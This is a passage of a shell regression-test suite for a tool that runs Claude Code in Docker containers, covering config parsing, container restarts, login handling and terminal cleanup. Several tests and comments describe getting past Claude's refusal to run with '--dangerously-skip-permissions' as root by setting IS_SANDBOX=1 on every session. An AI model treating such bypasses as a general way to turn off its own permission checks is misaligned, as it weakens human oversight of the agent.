  # (printf '[caps]\nenv') silently dropped that last cap: _read_caps_from_file
  # looped with a bare `while IFS= read -r line` and no `|| [[ -n "$line" ]]`, so
  # the unterminated final line was lost. The project's requested cap was never
  # seen, so no trust prompt fired and the cap never applied (and the box drifted
  # because it had been created when the cap still applied). Fix mirrors
  # _parse_env_file. Reproduce the exact input: env on the last line, no newline.
  printf '[caps]\nenv' > "$TEST_TEMP/.cleat"
  run _read_caps_from_file "$TEST_TEMP/.cleat"
  assert_success
  [[ "$output" == *"env"* ]] \
    || { echo "REGRESSION: last capability dropped from a no-trailing-newline .cleat"; return 1; }
}

@test "regression: [resources] reader keeps a final line that lacks a trailing newline" {
  # Same class as the caps-reader bug: _read_resource_from_file looped with a
  # bare `while IFS= read -r line` and no `|| [[ -n "$line" ]]`, so a hand-edited
  # .cleat ending in `memory = 8g` with no trailing newline silently dropped the
  # configured ceiling and the box fell back to the VM-derived default. The
  # header comment even claimed "Same parsing hygiene as [caps]", which was false.
  printf '[resources]\nmemory = 8g' > "$TEST_TEMP/.cleat"
  run _read_resource_from_file "$TEST_TEMP/.cleat" memory
  assert_success
  [[ "$output" == "8g" ]] \
    || { echo "REGRESSION: configured ceiling dropped from a no-trailing-newline [resources]"; return 1; }
}

@test "regression v0.15.1: rotated SSH-agent socket after reboot recreates instead of failing to start" {
  # macOS launchd regenerates the SSH agent socket directory
  # (…/com.apple.launchd.XXXX/Listeners) on every reboot, so SSH_AUTH_SOCK
  # rotates. A stopped ssh-cap container has the OLD path baked into its mount
  # spec; `docker start` re-mounts it and aborts with an opaque OCI error:
  #   error mounting "…/Listeners" to rootfs at "/tmp/ssh-agent.sock" …
  #   not a directory. cmd_start must detect the vanished bind source up front
  # and recreate (the settings overlay alone never caught it).
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  is_running() { return 1; }
  mock_docker_ps_a "$cname"
  # Settings overlay intact, so the OTHER stale-check passes …
  mkdir -p "$CLEAT_RUN_DIR/${cname}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${cname}/settings/settings.json"
  # … but the rotated SSH-agent socket source is gone.
  mock_docker_inspect "$(printf 'bind|%s\nbind|%s\n' \
    "$TEST_TEMP/project" "$TEST_TEMP/run/com.apple.launchd.GONE/Listeners")"

  run cmd_start "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Recreating container"
  run docker_calls
  assert_output --partial "docker rm -f $cname"
  assert_output --partial "docker run"
  refute_output --partial "docker start $cname"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/clip"
}

@test "regression: containers are created with --init so PID 1 reaps zombies" {
  # Without --init, PID 1 inside the box is `su`, which never wait()s on
  # re-parented children. Orphans from agent subshells accumulate as zombies
  # until the box hits --pids-limit: fork() fails, node aborts mid-frame, and
  # the attached terminal freezes (observed live: a 2-day box wedged at the
  # pids cap with ~900 zombie bash procs). --init makes docker's bundled tini
  # PID 1, which reaps everything and forwards SIGTERM (so `cleat stop` no
  # longer burns its full timeout and SIGKILLs, the historical fleet all
  # shows Exited(137) for this reason).
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "--init"
  assert_success
}

@test "regression: claude's exit code survives clip-daemon cleanup in the session script" {
  # The session script used to end with `kill/wait $_MY_CLIP_DAEMON`, so the
  # `bash -c` exit status was the daemon wait's 0, masking a crashed claude
  # (SIGSEGV=139, SIGABRT=134) as a clean session end, whose rc==0 branch then
  # ERASED the crash message bash had just printed. The script must capture
  # claude's status and exit with it.
  run exec_claude "test-ctr" --dangerously-skip-permissions
  run assert_docker_exec_has 'claude "$@"'
  assert_success
  run assert_docker_exec_has 'exit "$_CLAUDE_RC"'
  assert_success
}

@test "regression: the session script propagates a crashed claude's exit code when executed" {
  # The text-pin above can't catch a capture-ORDER regression: moving
  # _CLAUDE_RC=$? after the daemon kill re-masks crashes with the kill's 0.
  # So capture the ACTUAL script sent to docker exec and run it with a
  # SIGSEGV-ing claude stub: the wrapper must exit 139, not 0.
  local script_file="$TEST_TEMP/inner_script"
  docker() {
    if [[ "$1" == "exec" ]]; then
      local arg prev=""
      for arg in "$@"; do
        if [[ "$prev" == "-c" && "$arg" == *"clip-daemon &"* ]]; then
          printf '%s' "$arg" > "$script_file"
        fi
        prev="$arg"
      done
      return 0
    fi
    command docker "$@"
  }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  [ -s "$script_file" ] || { echo "session script not captured"; return 1; }
  mkdir -p "$TEST_TEMP/fakebin"
  printf '#!/usr/bin/env bash\nexit 139\n' > "$TEST_TEMP/fakebin/claude"
  printf '#!/usr/bin/env bash\nsleep 30\n' > "$TEST_TEMP/fakebin/clip-daemon"
  chmod +x "$TEST_TEMP/fakebin/claude" "$TEST_TEMP/fakebin/clip-daemon"
  run env PATH="$TEST_TEMP/fakebin:$PATH" CLEAT_CLIP_DIR="$TEST_TEMP" \
    bash "$script_file" --dangerously-skip-permissions
  assert_failure 139
}

@test "regression: docker exec stderr surfaces when the session fails" {
  # Host-side docker errors ('exec failed: resource temporarily unavailable'
  # during fork lockup, daemon connection resets) were thrown away by
  # 2>/dev/null, leaving the user with a corrupted terminal and zero
  # diagnostics. On a non-zero exit they must be shown.
  _wait_for_coder_remap() { true; }
  _ensure_docker_access() { true; }
  export DOCKER_STDERR="exec failed: resource temporarily unavailable"
  export DOCKER_EXIT_CODE=1
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_output --partial "exited with code 1"
  assert_output --partial "resource temporarily unavailable"
}

@test "regression: interactive session restores terminal state after docker exec" {
  # A hard-dying claude (SIGSEGV under amd64 emulation, fork lockup) leaves
  # the host terminal in raw mode with alt-screen/mouse-tracking on, every
  # keystroke and scroll sprays escape garbage until a manual `reset`.
  # exec_claude must always run the terminal-restore path after the exec.
  _restore_terminal() { echo "RESTORE_TERMINAL_CALLED"; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_output --partial "RESTORE_TERMINAL_CALLED"
}

@test "regression: clean session end emits no cursor-up erase into a pipe" {
  # The rc==0 branch unconditionally printed '\033[A\033[2K' (cursor-up +
  # erase-line) even when stdout was not a terminal, corrupting piped/captured
  # output, and after a masked crash it deleted the crash evidence itself.
  # The erase is cosmetic TTY furniture: it must be TTY-gated.
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_output --partial "Session ended"
  refute_output --partial $'\033[A'
}

@test "regression: clean session end clears the success line so stale terminal bytes can't survive" {
  # Observed on a heavily-used terminal: a stray hash tail ("e001861") trailed
  # the "cleat resume" message. Cause: the reclaim sequence moved up, erased the
  # line ABOVE, dropped back down, then success() wrote from column 0 WITHOUT
  # clearing to end-of-line, so stale bytes already on that row survived past
  # the message. Fix: clear the destination line too (a trailing \033[2K after
  # the \r\n). Force TTY so the (TTY-gated) sequence is actually emitted.
  _is_tty() { return 0; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  assert_output --partial "Session ended"
  # Erase the reclaimed line above, drop down, AND clear the success line.
  assert_output --partial $'\033[A\033[2K\r\n\033[2K'
}

@test "regression v0.16.4: resizing the Docker VM does not trigger config drift" {
  # The fingerprint folded in resolve_box_memory, whose default is a quarter of
  # the Docker VM clamped to [4g,8g]. So nudging the Docker memory slider, or a
  # CLI release that retunes that formula (the 2g→4g floor change in v0.16.1),
  # moved the hash and fired a false "config changed, recreate?" on a box the
  # user never touched. The fingerprint now reads CONFIGURED resources only, so
  # an unconfigured box hashes the same no matter the VM size or CLI version.
  run bash -c '
    source "'"$CLI"'"
    ACTIVE_CAPS=(git env); _RESOLVED_ENV_ARGS=(-e "FOO=bar")
    proj="'"$TEST_TEMP"'/vmproj"; mkdir -p "$proj"
    CLEAT_GLOBAL_CONFIG="'"$TEST_TEMP"'/no-such-config"
    _docker_vm_memory() { echo "$(( 7 * 1073741824 ))"; }
    h1="$(compute_config_fingerprint "$proj")"
    _docker_vm_memory() { echo "$(( 48 * 1073741824 ))"; }
    h2="$(compute_config_fingerprint "$proj")"
    [[ "$h1" == "$h2" ]] || { echo "DRIFTED: $h1 vs $h2" >&2; exit 1; }
    echo "STABLE"
  '
  assert_success
  assert_output --partial "STABLE"
}

@test "regression v0.16.4: a legacy (pre-v2) config-hash is never nagged to recreate" {
  # Containers created before the v0.16.4 fingerprint format carry a bare hash
  # whose inputs we can't reconstruct (old formula, unknown VM size at creation).
  # The upgrade to v0.16.4 must NOT prompt them to recreate (the exact false
  # positive being fixed): only current-format (v2:) hashes are compared, anything
  # else is left untouched until its next genuine recreate.
  run bash -c '
    source "'"$CLI"'"
    container_exists() { return 0; }
    _container_config_hash() { echo "0123456789abcdef"; }   # bare legacy hash, no v2: prefix
    compute_config_fingerprint() { echo "anything-different"; }
    _is_tty() { return 0; }
    echo "y" | _resolve_config_drift "cleat-foo" ""
  '
  assert_success
  refute_output --partial "Config changed"
}

@test "regression v0.16.4: a fired Claude-update prompt closes with a trailing blank" {
  # After "Claude Code upgraded", the bring-up (Container started …) printed flush
  # against the confirmation. The prompt opens with a blank line, so it must also
  # close with one, but only when it actually fired (a throttled/no-op start prints
  # neither). SENTINEL stands in for the bring-up; the blank must survive before it.
  run bash -c '
    source "'"$CLI"'"
    _is_tty() { return 0; }
    image_exists() { return 0; }
    _upgrade_claude_image() { echo "UPGRADE_CALLED"; return 0; }
    CLAUDE_CHECK_FILE="'"$TEST_TEMP"'/.cuc"
    CLEAT_FORCE_CLAUDE_CHECK=1
    CLEAT_FAKE_REMOTE_CLAUDE="2.1.149"
    _image_claude_version() { echo "2.1.40"; }
    out="$( _maybe_prompt_claude_update <<< "y"; printf "SENTINEL\n" )"
    last="$(printf "%s\n" "$out" | tail -2 | head -1)"
    [[ -z "$last" ]] || { echo "NO TRAILING BLANK; last=[$last]" >&2; exit 1; }
    echo "BLANK_OK"
  '
  assert_success
  assert_output --partial "BLANK_OK"
}

@test "regression v0.16.4: the Docker VM size rounds to the slider, not the kernel's reported floor" {
  # img_1.png: a 16 GB Docker Desktop slider is reported by `docker info` as the
  # guest kernel's MemTotal (~15.6 GiB; the kernel reserves some at boot). Flooring
  # that printed a misleading "15 GB" and false-positived the undersized advisory on
  # a VM that was sized right. Rounding to the nearest GB recovers the slider's 16;
  # a genuine 15 GB slider (~14.6 GiB) still rounds to 15, so the two stay distinct.
  run bash -c '
    source "'"$CLI"'"
    [[ "$(_vm_gb_rounded 16750372454)" == "16" ]] || { echo "16 GB slider misread as $(_vm_gb_rounded 16750372454)" >&2; exit 1; }
    [[ "$(_vm_gb_rounded 15676000000)" == "15" ]] || { echo "15 GB slider misread" >&2; exit 1; }
    [[ "$(_vm_gb_rounded 8589934592)"  == "8"  ]] || { echo "8 GiB exact misread" >&2; exit 1; }
    # A digit-only value with a leading zero must read base-10, not abort as octal.
    [[ "$(_vm_gb_rounded 016750372454)" == "16" ]] || { echo "zero-padded value misread as [$(_vm_gb_rounded 016750372454)]" >&2; exit 1; }
    echo "ROUNDS_OK"
  '
  assert_success
  assert_output --partial "ROUNDS_OK"
}

@test "regression v0.16.4: the prune notice and the VM advisory are separated by a blank line" {
  # img_1.png: on a daily check both the bloat→prune prompt and the undersized-VM
  # advisory fire. They ran flush ("Pruned N images." directly above "Docker VM
  # memory is ..."). The advisory must own a blank line above it even when an earlier
  # notice already printed (the old `$printed || echo ""` suppressed that separator).
  run bash -c '
    source "'"$CLI"'"
    PRESSURE_CHECK_FILE="'"$TEST_TEMP"'/regr-pressure-nostamp"; rm -f "$PRESSURE_CHECK_FILE"
    _is_tty() { return 0; }
    _cleat_prunable_stats() { printf "7\t8192"; }     # bloat → prune offered (stamp absent → due)
    _docker_vm_memory() { echo "8589934592"; }        # 8 GiB VM (undersized)
    _host_total_memory() { echo "34359738368"; }      # 32 GiB Mac
    _running_memory_limits_sum() { echo "0"; }
    _is_docker_desktop() { return 0; }
    cmd_prune() { echo "PRUNE_DONE"; }
    out="$(_maybe_check_docker_pressure <<< "y")"
    before="$(printf "%s\n" "$out" | grep -B1 "Docker VM memory is" | head -1)"
    [[ -z "${before// /}" ]] || { echo "NOT SEPARATED; line above=[$before]" >&2; exit 1; }
    echo "SEPARATED_OK"
  '
  assert_success
  assert_output --partial "SEPARATED_OK"
}

@test "regression v0.16.5: a 24 GB Docker Desktop slider displays as 24 GB, not 23" {
  # img: "Docker tuned for Cleat (23 GB VM ...)" while the slider was set to 24. The
  # guest kernel's MemTotal for a 24 GB VM lands ~23.4 GiB (the kernel reserve grows
  # with VM size), and round-to-nearest reads that as 23, indistinguishable from a
  # genuine 23 GB slider. The configured slider value (MemoryMiB) must drive the
  # display. Revert _docker_vm_display_gb to _vm_gb_rounded and this reads 23.
  run bash -c '
    source "'"$CLI"'"
    cfg="$(_DD_MEMORY_MIB=24576 _docker_vm_display_gb 25125558681)"   # ~23.4 GiB MemTotal
    [[ "$cfg" == "24" ]] || { echo "24 GB slider displayed as [$cfg]" >&2; exit 1; }
    # The disambiguation MemTotal alone cannot make: rounding ~23.4 GiB reads 23.
    [[ "$(_vm_gb_rounded 25125558681)" == "23" ]] || { echo "expected the rounded MemTotal to read 23" >&2; exit 1; }
    # No settings and no override falls back to rounding the MemTotal.
    fb="$(_DD_SETTINGS_DIR="'"$TEST_TEMP"'/no-dd" _docker_vm_display_gb 17179869184)"
    [[ "$fb" == "16" ]] || { echo "fallback misread 16 GiB as [$fb]" >&2; exit 1; }
    echo "SLIDER_OK"
  '
  assert_success
  assert_output --partial "SLIDER_OK"
}

@test "regression v0.16.5: the bridge does not re-open a plain link the terminal already opened" {
  # The link double-open (a 2nd tab ~0.5s later): the host terminal opens a clicked
  # URL itself AND the in-container open shim writes the bridge, so the watcher
  # opened it a second time. On an interactive terminal the bridge must DEFER plain
  # links. Drop the host_opens_clicks gate and this opens (the duplicate returns).
  # Retargeted for the browser destination gate, which added a fourth argument.
  # The duplicate-tab property this regression exists for is untouched: auto plus
  # an interactive terminal plus a plain link still defers. The third line
  # INVERTED, and deliberately: off a TTY a plain link now defers too, because
  # that window is cleat login, a pipe, cron and nohup, where nobody is watching
  # the browser. `always` carries the old behaviour and is asserted here so the
  # escape hatch cannot regress either.
  run bash -c '
    source "'"$CLI"'"
    # auto + interactive terminal + plain link -> defer (rc 1). The duplicate.
    if _browser_should_open auto 1 0 1; then echo "PLAIN OPENED (duplicate)" >&2; exit 1; fi
    # auto + interactive + allowlisted auth URL -> still opens (the bridge owns login URLs).
    _browser_should_open auto 1 1 1 || { echo "auth URL wrongly deferred" >&2; exit 1; }
    # auto + no terminal + plain -> defers now, and always still opens it.
    if _browser_should_open auto 0 0 1; then echo "PLAIN OPENED UNATTENDED" >&2; exit 1; fi
    _browser_should_open always 0 0 0 || { echo "always stopped being a full bypass" >&2; exit 1; }
    echo "NO_DUP_OK"
  '
  assert_success
  assert_output --partial "NO_DUP_OK"
}

@test "regression v1.1.0: overload notice does not set-e abort start with exactly ONE running session" {
  # The session-count pluralization `session$( (( n != 1 )) && printf s )` in a
  # PLAIN assignment returns exit 1 when n==1 (the && short-circuits the sub),
  # which under the CLI's `set -euo pipefail` aborted the start/resume/run path
  # before launching the box. Strict mode is LIVE here because we source the RAW
  # CLI (not source_cli, which strips set -e). Reverting the fix re-crashes this
  # (the assertions after the assignment are never reached).
  run bash -c '
    source "'"$CLI"'"
    PRESSURE_CHECK_FILE=/dev/null
    _is_tty() { return 0; }
    _cleat_prunable_stats() { printf "0\t0"; }
    _docker_vm_memory() { echo 8589934592; }            # 8 GiB VM
    _running_memory_limits_sum() { echo 42949672960; }  # 40 GiB -> overloaded
    _running_cleat_box_count() { echo 1; }              # the singular case
    _host_total_memory() { echo 34359738368; }
    _is_docker_desktop() { return 1; }
    _maybe_check_docker_pressure
    echo "REACHED_END_OK"
  '
  assert_success
  assert_output --partial "1 session still running"
  assert_output --partial "REACHED_END_OK"
}

# ─────────────────────────────────────────────────────────────────────────────
# 2026-07-07 login regressions (in-box code-paste flow + cross-box identity)
# ─────────────────────────────────────────────────────────────────────────────

# 2026-07-07 hardening: _is_auth was keyed on the loopback port, so any OAuth
# authorize URL WITHOUT a localhost callback (Claude's code-paste login URL,
# gh-auth-style flows) classified as a PLAIN link and, in an interactive
# session (auto mode, host_opens_clicks=1), was deferred to a terminal that
# never opens programmatically emitted URLs: a stranded login. Claude 2.1.x
# hands its opener only the loopback URL today (the primary regression was the
# missing $BROWSER, see the next test), but a non-loopback authorize URL
# reaching the bridge must never strand a login again.
@test "regression v1.1.1: code-paste login URL (no loopback callback) still auto-opens in an interactive session" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _auth_callback_proxy() { :; }   # must not be reached: there is no port
  cat > "$TEST_TEMP/fake_open" <<SCRIPT
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
SCRIPT
  chmod +x "$TEST_TEMP/fake_open"
  # _extract_callback_port is intentionally NOT mocked: the URL has no
  # loopback callback, and the watcher must open it anyway.
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://claude.ai/oauth/authorize?code=true&client_id=abc&redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Foauth%2Fcode%2Fcallback&scope=user" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/opened.log" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.log" ] || { echo "code-paste login URL was deferred; in-session login never reaches a browser"; return 1; }
  run cat "$TEST_TEMP/opened.log"
  assert_output --partial "console.anthropic.com"
}

# Claude Code 2.1.191+ refuses to invoke ANY opener on a display-less Linux
# system unless \$BROWSER is set, and its login drops to the manual code-paste
# flow: the open shim never fired, so the bridge never even saw the login URL.
# Creating the box with BROWSER pointing at the shim flips both gates (URLs
# open through the bridge, and the hands-free loopback login returns).
@test "regression v1.1.1: container is created with BROWSER pointing at the open shim" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "BROWSER=/usr/local/bin/open-bridge"
  assert_success
}

# The v1.1.1 fix above only lands at CREATE: docker exec inherits the
# container's Config.Env, frozen at create time, so a box created before
# v1.1.1 never sees that -e BROWSER and claude 2.1.191+ still drops to the
# manual code-paste login on every /login, forever. Nothing ever nags a
# recreate (the config fingerprint deliberately excludes cleat-injected env),
# so long-lived boxes stayed broken across releases; reported on real
# hardware 2026-07-11. Every session exec must therefore carry BROWSER
# itself, healing existing boxes with no recreate.
@test "regression: attaching to a box created before v1.1.1 still gets BROWSER at exec time" {
  # exec_claude alone, no cmd_run first: the recorded exec is the ONLY place
  # BROWSER can come from, exactly like a pre-v1.1.1 container's frozen env.
  run exec_claude "prev111-ctr" --dangerously-skip-permissions
  run assert_docker_exec_has "prev111-ctr"
  assert_success
  run assert_docker_exec_has "BROWSER=/usr/local/bin/open-bridge"
  assert_success
}

# An in-box login writes oauthAccount only into THAT box's per-project
# claude.json; the host file never learns it. After a logout wiped the shared
# credentials, the user logged in again in one box, opened a second terminal,
# and was asked to log in AGAIN: the other box's claude.json had no
# oauthAccount (the login gate) even though the shared .credentials.json was
# fresh. Starting a stopped box must fold the newest sibling login in.
@test "regression v1.1.1: starting a stopped box after an in-box login elsewhere carries the login in" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  is_running() { return 1; }   # container exists but is NOT running
  mock_docker_ps_a "$cname"
  mkdir -p "$CLEAT_RUN_DIR/${cname}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${cname}/settings/settings.json"
  rm -f "${HOME}/.claude.json"   # the host never logs in
  # the login happened inside ANOTHER box
  mkdir -p "$CLEAT_PROJECTS_DIR/box-elsewhere"
  echo '{"oauthAccount":{"emailAddress":"inbox@login.dev"},"userID":"u9"}' > "$CLEAT_PROJECTS_DIR/box-elsewhere/claude.json"
  # this box's copy predates that login (the logout wiped its oauthAccount)
  local key
  key="$(_derive_project_session_key "$TEST_TEMP/project" "main")"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  echo '{"projects":{}}' > "$CLEAT_PROJECTS_DIR/$key/claude.json"

  run cmd_start "$TEST_TEMP/project"
  assert_output --partial "Container started"
  run jq -r '.oauthAccount.emailAddress' "$CLEAT_PROJECTS_DIR/$key/claude.json"
  assert_output "inbox@login.dev"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings"
}

# An in-box /logout leaves hasCompletedOnboarding:false in that box's live
# bind-mounted ~/.claude.json (and deletes the shared credentials). Claude
# 2.1.x gates its startup login/onboarding screen on that flag ALONE, and
# cleat re-forced it only at container (re)create, so every new session in the
# still-running box demanded a login again, even after a fresh login elsewhere
# had restored the shared credentials. Attaching must heal the file in place
# (same inode: the bind mount pins it) when no live agent is in the box.
@test "regression v1.1.1: attaching to a running logged-out box heals its claude.json in place" {
  local cname="heal-ctr"
  _RESOLVED_PROJECT="$TEST_TEMP/project"
  mkdir -p "$_RESOLVED_PROJECT"
  local key
  key="$(_derive_project_session_key "$_RESOLVED_PROJECT" "main")"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  local f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  echo '{"hasCompletedOnboarding":false,"projects":{}}' > "$f"
  # the identity to inherit lives in a sibling box (where the user logged in)
  mkdir -p "$CLEAT_PROJECTS_DIR/box-elsewhere2"
  echo '{"oauthAccount":{"emailAddress":"heal@login.dev"}}' > "$CLEAT_PROJECTS_DIR/box-elsewhere2/claude.json"
  rm -f "${HOME}/.claude.json"
  _box_has_live_agent() { return 1; }   # no claude/node running in the box

  local inode_before inode_after
  inode_before="$(ls -i "$f" | awk '{print $1}')"
  run exec_claude "$cname" --dangerously-skip-permissions
  inode_after="$(ls -i "$f" | awk '{print $1}')"

  run jq -r '.hasCompletedOnboarding' "$f"
  assert_output "true"
  run jq -r '.oauthAccount.emailAddress' "$f"
  assert_output "heal@login.dev"
  [ "$inode_before" = "$inode_after" ] || { echo "inode changed: the bind-mounted file was swapped, the running box would keep reading the old one"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.1.1 (latent since the settings mask): a fresh host that never ran native
# claude has no ~/.claude/settings.json, and on macOS Docker Desktop the
# settings mask (a FILE bind nested inside the ~/.claude bind) fails with an
# opaque OCI "outside of rootfs" error when its target is missing inside the
# parent bind's source (VirtioFS cannot create files at nested bind targets).
# Every developer machine masked the bug because the file existed; the
# integration suite run against a real macOS daemon (2026-07-10) exposed it.
# The fix pre-creates the target as '{}' (valid JSON, inert for native
# claude), exactly like the history.jsonl touch above it in cmd_run.
@test "regression v1.1.1: fresh host without ~/.claude/settings.json can create a box under virtiofs" {
  export DOCKER_STUB_SIMULATE_VIRTIOFS=1
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  rm -f "$HOME/.claude/settings.json"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # The pre-created target must be valid JSON so native claude still parses it.
  run cat "$HOME/.claude/settings.json"
  assert_output "{}"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.0: on a root-only host (a stock VPS image, `sudo cleat`) the
# entrypoint's uid remap makes the box user uid 0, and claude hard-refuses
# --dangerously-skip-permissions under uid 0 (its root/sudo guard,
# anthropics/claude-code#9184), so every session died at launch with "Claude
# exited with code 1" right after a green bring-up. IS_SANDBOX=1 is upstream's
# own bypass for sandboxed containers (their reference devcontainer sets it).
# It must ride CLAUDE_ENV (every exec, like the BROWSER heal) so existing root
# boxes heal on their next session, and must stay OUT of the env on non-root
# hosts so an ordinary box's environment is unchanged.
@test "regression v1.2.0: root host rides IS_SANDBOX=1 on every session exec, non-root stays clean" {
  # CLAUDE_ENV is built at SOURCE time from `id -u`, so both branches must be
  # exercised in fresh subprocesses with a shimmed id (a shell function beats
  # the PATH binary inside command substitution), same technique as the
  # COLORTERM test in exec_claude.bats.
  local stripped="$TEST_TEMP/cli_stripped_rootenv"
  sed 's/^set -euo pipefail$/:/' "$CLI" > "$stripped"
  run bash -c "id() { echo 0; }; source '$stripped'; printf '%s\n' \"\${CLAUDE_ENV[@]}\""
  assert_success
  assert_output --partial "IS_SANDBOX=1"
  run bash -c "id() { echo 501; }; source '$stripped'; printf '%s\n' \"\${CLAUDE_ENV[@]}\""
  assert_success
  refute_output --partial "IS_SANDBOX"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.1: a user-namespaced engine (rootless Docker, Docker Desktop for Linux)
# maps the HOST USER to container uid 0, so the box's remapped `coder` is uid 0
# there even though the host user is not root. Claude hard-refuses
# --dangerously-skip-permissions under uid 0, so passing the in-namespace
# identity WITHOUT this makes every session on such an engine die at launch
# with "Claude exited with code 1" right after a green bring-up. The two have
# to move together, which is why this is pinned separately from the uid itself.
@test "regression v1.5.1: a box that will run as uid 0 rides IS_SANDBOX even when the host user is not root" {
  local stripped="$TEST_TEMP/cli_stripped_uidmap"
  sed 's/^set -euo pipefail$/:/' "$CLI" > "$stripped"
  mkdir -p "$TEST_TEMP/uidmaphome/.config/cleat/state"
  printf 'default\t-\t501\t0 0\n' > "$TEST_TEMP/uidmaphome/.config/cleat/state/uidmap"
  run bash -c "id() { echo 501; }; export HOME='$TEST_TEMP/uidmaphome'; unset XDG_CONFIG_HOME DOCKER_CONTEXT DOCKER_HOST; source '$stripped'; printf '%s\n' \"\${CLAUDE_ENV[@]}\""
  assert_success
  assert_output --partial "IS_SANDBOX=1"
}

# The same engine, but nothing measured yet: the flag must NOT appear, or every
# ordinary box on every ordinary engine gets an env it should not have.
@test "regression v1.5.1: an unmeasured engine leaves a non-root host's env clean" {
  local stripped="$TEST_TEMP/cli_stripped_uidmap_none"
  sed 's/^set -euo pipefail$/:/' "$CLI" > "$stripped"
  mkdir -p "$TEST_TEMP/uidmaphome2/.config/cleat"
  run bash -c "id() { echo 501; }; export HOME='$TEST_TEMP/uidmaphome2'; unset XDG_CONFIG_HOME DOCKER_CONTEXT DOCKER_HOST; source '$stripped'; printf '%s\n' \"\${CLAUDE_ENV[@]}\""
  assert_success
  refute_output --partial "IS_SANDBOX"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.2: the suite runner printed `grep -A5` after each "not ok", and
# bats-assert puts the expected and actual values AFTER its assertion header, so
# a failure showed which line failed and cut off what it saw. A CI-only failure
# on 2026-09-22 could not be diagnosed from its log for exactly that reason. Run
# a copy of test.sh against one fixture that fails on purpose and demand the
# value the fixture really saw in the summary.
@test "regression v1.5.2: the test runner shows what a failed assertion actually saw" {
  local h="$TEST_TEMP/runner"
  mkdir -p "$h/test/unit" "$h/test/lib"
  cp "$PROJECT_ROOT/test.sh" "$h/test.sh"
  cp "$PROJECT_ROOT/test/lib/testlock.sh" "$h/test/lib/testlock.sh"
  ln -s "$PROJECT_ROOT/test/bats" "$h/test/bats"
  cat > "$h/test/unit/fixture.bats" <<EOF
load '$PROJECT_ROOT/test/test_helper/bats-support/load'
load '$PROJECT_ROOT/test/test_helper/bats-assert/load'
@test "fixture fails on purpose" {
  run echo "the-value-it-really-saw"
  assert_output "what-it-expected"
}
EOF
  # The copy must not inherit the runner's own knobs from the leg running THIS
  # suite: a sharded CI leg exports TEST_SHARD_TOTAL/INDEX, and one fixture file
  # split four ways leaves shard 3 with nothing to run.
  run env -u TEST_SHARD_TOTAL -u TEST_SHARD_INDEX -u TEST_MAX_SKIPPED bash "$h/test.sh" < /dev/null
  assert_failure
  assert_output --partial "fixture fails on purpose"
  assert_output --partial "the-value-it-really-saw"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.2: the live switch's note naming a Claude Code version cleat had not
# checked the handoff against (disclosure D10) could never appear. The probe
# parser set every session's version to empty and nothing filled it, and the
# box probe never sent one. v1.5.0's notes promised the handoff "says so when a
# box runs another version". A maintainer switch on 2.1.280, then unlisted,
# showed no note. The version is in Claude's own session file.
@test "regression v1.5.2: the probe parser keeps the Claude Code version a session reports" {
  CLEAT_RUN_DIR="$TEST_TEMP/run"; mkdir -p "$CLEAT_RUN_DIR"
  local sid="d7b73579-1111-2222-3333-444455556666"
  _handoff_docker_exec() {
    printf 'hb\t1\nargs\tok\nclaude\t7004242 5551 idle none interactive deadbeef1234cafe named %s 2.1.999\nend\tok\n' \
      "d7b73579-1111-2222-3333-444455556666" > "$3"
  }
  _handoff_probe "cleat-reg-box"
  assert_equal "${_HO_VER[0]:-}" "2.1.999"
  assert_equal "${_HO_SID[0]:-}" "$sid"
}

@test "regression v1.5.2: a lock released during the planted check never reads as planted" {
  # The account lock asked "exists, and not a directory?" in two stats. A holder
  # that released between them read as a planted file, and the waiter gave up
  # with "Another cleat command is changing accounts right now" at the moment
  # the lock came free. The account race tests hit it on CI. A directory made
  # and removed as fast as a shell can must never read as planted.
  local lock="$TEST_TEMP/flip.lock" tp end hit=0 held=0 free=0
  ( while :; do mkdir "$lock" 2>/dev/null; rmdir "$lock" 2>/dev/null; done ) 3>&- &
  tp=$!
  end=$(( SECONDS + 2 ))
  while [[ $SECONDS -lt $end && $hit -eq 0 ]]; do
    if _lock_path_planted "$lock"; then hit=1; fi
    if [[ -d "$lock" ]]; then held=$(( held + 1 )); else free=$(( free + 1 )); fi
  done
  kill "$tp" 2>/dev/null || true
